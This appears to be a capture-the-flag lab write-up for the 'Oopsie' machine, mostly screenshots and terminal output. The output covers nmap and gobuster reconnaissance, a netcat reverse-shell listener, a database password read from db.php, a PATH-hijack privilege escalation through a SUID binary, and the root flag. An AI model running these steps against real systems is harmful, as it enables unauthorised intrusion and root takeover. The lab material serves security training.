
<img width="1608" height="317" alt="image" src="https://github.com/user-attachments/assets/8da8ef38-29d4-45a5-8c2c-92192350cc98" />





```
nmap -sV -sC -A 10.129.147.70                       
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-13 13:09 -0400
Nmap scan report for 10.129.147.70
Host is up (0.28s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome
|_http-server-header: Apache/2.4.29 (Ubuntu)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   287.31 ms 10.10.14.1
2   290.74 ms 10.129.147.70


```

<img width="1786" height="574" alt="image" src="https://github.com/user-attachments/assets/c1fb2856-c102-492b-be48-fdd01a083123" />




<img width="1913" height="705" alt="image" src="https://github.com/user-attachments/assets/b44be256-b444-412c-9dcc-c76c0dc1f48d" />



<img width="2001" height="655" alt="image" src="https://github.com/user-attachments/assets/929aef86-c5c4-4165-a003-da57af0c2b40" />



<img width="1901" height="684" alt="image" src="https://github.com/user-attachments/assets/f7b0f8d8-11df-453e-b3cc-870128dc9977" />



<img width="1901" height="351" alt="image" src="https://github.com/user-attachments/assets/ec6e4a64-97af-47f7-bd3d-54698fa987db" />





<img width="1930" height="293" alt="image" src="https://github.com/user-attachments/assets/e3b95602-868e-4f0a-a8cd-86d57c8a7ff8" />








![[Pasted image 20260713235034.png]]


![[Pasted image 20260713235213.png]]

![[Pasted image 20260713235255.png]]

![[Pasted image 20260713235900.png]]


```
gobuster dir -u  http://10.129.151.199 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.151.199
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
images               (Status: 301) [Size: 317] [--> http://10.129.151.199/images/]
index.php            (Status: 200) [Size: 10932]
themes               (Status: 301) [Size: 317] [--> http://10.129.151.199/themes/]
uploads              (Status: 301) [Size: 318] [--> http://10.129.151.199/uploads/]
css                  (Status: 301) [Size: 314] [--> http://10.129.151.199/css/]
js                   (Status: 301) [Size: 313] [--> http://10.129.151.199/js/]
Progress: 3947 / 175326 (2.25%)^C

```





![[Pasted image 20260715020442.png]]

![[Pasted image 20260715020600.png]]



![[Pasted image 20260715024220.png]]

```
nc -lvnp 4444         
listening on [any] 4444 ...
connect to [10.10.14.107] from (UNKNOWN) [10.129.151.255] 41984
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 20:43:16 up 9 min,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cd /var/www/html/cdn-cgi/login
$ ls
admin.php
db.php
index.php
script.js
$ cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
$ 




```

![[Pasted image 20260715024641.png]]






![[Pasted image 20260715024919.png]]


![[Pasted image 20260715025055.png]]





```
_find / -group bugtracker 2>/dev/null_
```


![[Pasted image 20260715025242.png]]


![[Pasted image 20260715025319.png]]


```
robert@oopsie:~$ cd ../.././tmp
cd ../.././tmp
robert@oopsie:/tmp$ rm -f cat
rm -f cat
robert@oopsie:/tmp$ echo /bin/sh > cat
echo /bin/sh > cat
robert@oopsie:/tmp$ chmod +x cat
chmod +x cat
robert@oopsie:/tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
robert@oopsie:/tmp$ /usr/bin/bugtracker somefile
/usr/bin/bugtracker somefile

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 2
2
---------------

# id
id
uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)
# cd root
cd root
/bin/sh: 2: cd: can't cd to root
# ls
ls
cat
# pwd
pwd
/tmp
# cd ../../
cd ../../
# cd root
cd root
# cat  root.txt
cat  root.txt
# less root.txt

```


```
# cat  root.txt
cat  root.txt
# less root.txt
less root.txt
WARNING: terminal is not fully functional
root.txt  (press RETURN)
af13b0bee69f8a877c3faf667f7beacf
root.txt (END)

```


![[Pasted image 20260715025928.png]]








